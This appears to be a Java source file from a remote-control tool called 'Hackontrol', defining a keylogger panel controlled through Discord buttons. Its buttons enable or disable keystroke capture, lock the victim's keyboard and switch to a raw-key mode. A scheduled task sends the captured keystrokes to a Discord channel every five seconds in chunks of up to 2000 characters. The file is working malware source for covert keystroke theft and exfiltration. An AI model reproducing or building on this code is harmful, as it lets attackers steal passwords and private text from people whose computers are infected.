package com.khopan.hackontrol.panel;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.KeyboardHandler;
import com.khopan.hackontrol.KeyboardHandler.KeyEntry;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class KeyLoggerPanel extends Panel {
	private static final String PANEL_NAME = "keylogger";

	private static final Button BUTTON_ENABLE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerEnable");
	private static final Button BUTTON_DISABLE         = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerDisable");
	private static final Button BUTTON_LOCK            = ButtonManager.staticButton(ButtonType.SUCCESS, "Lock",    "keyloggerLock");
	private static final Button BUTTON_UNLOCK          = ButtonManager.staticButton(ButtonType.DANGER,  "Unlock",  "keyloggerUnlock");

	private static final Button BUTTON_RAW_KEY_ENABLE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerRawKeyEnable");
	private static final Button BUTTON_RAW_KEY_DISABLE = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerRawKeyDisable");

	@Override
	public String panelName() {
		return KeyLoggerPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_ENABLE,          context -> this.action(context, "KeyLogger is already enabled",    KeyboardHandler.Enable,      () -> KeyboardHandler.Enable = true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_DISABLE,         context -> this.action(context, "KeyLogger is already disabled",   !KeyboardHandler.Enable,     () -> KeyboardHandler.Enable = false));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_LOCK,            context -> this.action(context, "Keyboard is already locked",      KeyboardHandler.Block,       () -> KeyboardHandler.Block = true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_UNLOCK,          context -> this.action(context, "Keyboard is already unlocked",    !KeyboardHandler.Block,      () -> KeyboardHandler.Block = false));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_ENABLE,  context -> this.action(context, "Raw-key mode is already enabled", KeyboardHandler.RawKeyMode,  () -> KeyboardHandler.RawKeyMode = true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_DISABLE, context -> this.action(context, "Text mode is already enabled",    !KeyboardHandler.RawKeyMode, () -> KeyboardHandler.RawKeyMode = false));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.text("**KeyLogger**")
				.actionRow(KeyLoggerPanel.BUTTON_ENABLE, KeyLoggerPanel.BUTTON_DISABLE)
				.actionRow(KeyLoggerPanel.BUTTON_LOCK, KeyLoggerPanel.BUTTON_UNLOCK)
				.build(),
				ControlWidget.newBuilder()
				.text("**Raw-Key Mode**")
				.actionRow(KeyLoggerPanel.BUTTON_RAW_KEY_ENABLE, KeyLoggerPanel.BUTTON_RAW_KEY_DISABLE)
				.build()
		};
	}

	@Override
	public void initialize() {
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
			if(!KeyboardHandler.Enable) {
				KeyboardHandler.KEYSTROKE_LIST.clear();
				return;
			}

			if(KeyboardHandler.KEYSTROKE_LIST.isEmpty()) {
				return;
			}

			try {
				this.keylog();
			} catch(Throwable Errors) {
				Errors.printStackTrace();
				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
			}
		}, 5000, 5000, TimeUnit.MILLISECONDS);
	}

	private void action(ButtonContext context, String text, boolean already, Runnable setter) {
		if(already) {
			HackontrolMessage.boldDeletable(context.reply(), text);
			return;
		}

		setter.run();
		context.deferEdit().queue();
	}

	private void keylog() throws Throwable {
		List<String> messageList = new ArrayList<>();
		StringBuilder builder = new StringBuilder();
		boolean first = true;
		boolean previousSingleCharacter = true;
		boolean previousSpace = true;
		int limit = KeyboardHandler.RawKeyMode ? 2000 : 1992;
		String prefix = KeyboardHandler.RawKeyMode ? "" : "```\n";
		String suffix = KeyboardHandler.RawKeyMode ? "" : "\n```";

		for(int i = 0; i < KeyboardHandler.KEYSTROKE_LIST.size(); i++) {
			KeyEntry entry = KeyboardHandler.KEYSTROKE_LIST.get(i);
			String entryText;

			if(KeyboardHandler.RawKeyMode) {
				String asterisk = "*".repeat((entry.systemKey ? 2 : 0) + (entry.fake ? 1 : 0));
				StringBuilder rawKeyBuilder = new StringBuilder();
				rawKeyBuilder.append(asterisk);
				rawKeyBuilder.append('`');
				rawKeyBuilder.append(entry.keyDown ? '↓' : '↑');
				rawKeyBuilder.append(entry.keyName);
				rawKeyBuilder.append('`');
				rawKeyBuilder.append(asterisk);
				entryText = rawKeyBuilder.toString();
			} else {
				if(!entry.keyDown) {
					continue;
				}

				entryText = entry.keyName;
				boolean singleCharacter = entry.keyName.length() == 1;
				boolean space = entry.keyCode == 0x20;

				if((space || previousSpace) || (singleCharacter && previousSingleCharacter)) {
					first = true;
				}

				previousSingleCharacter = singleCharacter;
				previousSpace = space;
			}

			entryText = (first ? "" : " ") + entryText;
			first = false;

			if(builder.length() + entryText.length() > limit) {
				messageList.add(builder.toString());
				builder = new StringBuilder();
				first = true;
			}

			builder.append(entryText);
		}

		KeyboardHandler.KEYSTROKE_LIST.clear();

		if(!builder.isEmpty()) {
			messageList.add(builder.toString());
		}

		for(int i = 0; i < messageList.size(); i++) {
			this.channel.sendMessage(prefix + messageList.get(i) + suffix).queue();
		}
	}
}
